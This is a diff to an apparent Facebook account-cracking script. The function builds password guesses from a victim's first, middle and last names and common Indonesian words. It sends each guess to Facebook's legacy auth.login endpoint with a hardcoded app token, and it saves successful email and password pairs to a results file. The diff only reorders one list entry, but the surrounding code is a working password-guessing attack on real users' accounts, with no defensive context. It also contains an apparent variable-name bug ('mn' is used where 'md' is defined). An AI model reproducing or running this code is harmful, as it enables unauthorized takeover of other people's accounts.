@@ -302,7 +302,7 @@ def x(user):
 		fn = rq["first_name"]
 		md = rq["middle_name"]
 		ln = rq["last_name"]
-		for pas in [fn+"123",fn+'12345',mn+'123',mn+'12345',ln+"123",ln+"12345","Sayang","Sayang2","Sayangku","Anjing","Bangsat","Bajingan","Bandung","Buchin1","Bacot123","Cintaku","Cintaku1","Cinta123","Doraemon","Indonesia","Jakarta","Kontol123","Memek123","Surabaya","Lamongan","Sayang12345","qwertyuiop","1234567890","Master123"]:
+		for pas in [fn+"123",fn+'12345',mn+'123',mn+'12345',ln+"123",ln+"12345","Sayang","Sayang2","Sayang12345","Sayangku","Anjing","Bangsat","Bajingan","Bandung","Buchin1","Bacot123","Cintaku","Cintaku1","Cinta123","Doraemon","Indonesia","Jakarta","Kontol123","Memek123","Surabaya","Lamongan","qwertyuiop","1234567890","Master123"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("hasil/ok.txt","a").write("%s | %s\n"%(user,pas))
